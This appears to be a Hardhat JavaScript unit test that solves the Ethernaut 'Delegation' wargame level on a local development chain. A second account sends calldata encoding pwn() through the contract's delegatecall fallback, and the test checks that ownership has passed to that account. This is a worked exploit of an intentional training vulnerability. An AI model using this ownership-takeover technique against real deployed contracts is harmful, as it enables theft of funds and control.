const { assert, expect } = require("chai")
const { network, deployments, ethers, getNamedAccounts } = require("hardhat")
const {
    developmentChains,
    networkConfig,
} = require("../../helper-hardhat-config")

const parseEther = ethers.utils.parseEther
const formatEther = ethers.utils.formatEther
const getBalance = ethers.provider.getBalance

if (!developmentChains.includes(network.name)) {
    describe.skip
} else {
    describe("ethernaut_token Unit Tests", function () {
        let owner, user1, Delegate, Delegation
        beforeEach(async () => {
            ;[owner, user1] = await ethers.getSigners()

            const DelegateContract = await ethers.getContractFactory("Delegate")
            const DelegationContract = await ethers.getContractFactory(
                "Delegation"
            )
            Delegate = await DelegateContract.deploy(owner.address)
            Delegation = await DelegationContract.deploy(Delegate.address)
        })

        describe("break it", () => {
            it("default attack", async function () {
                expect(await Delegation.owner()).to.equal(owner.address)

                const ABI = ["function pwn() public"]
                const iface = new ethers.utils.Interface(ABI)
                await user1.sendTransaction({
                    from: user1.address,
                    to: Delegation.address,
                    data: iface.encodeFunctionData("pwn"),
                })
                expect(await Delegation.owner()).to.equal(user1.address)
            })
        })
    })
}
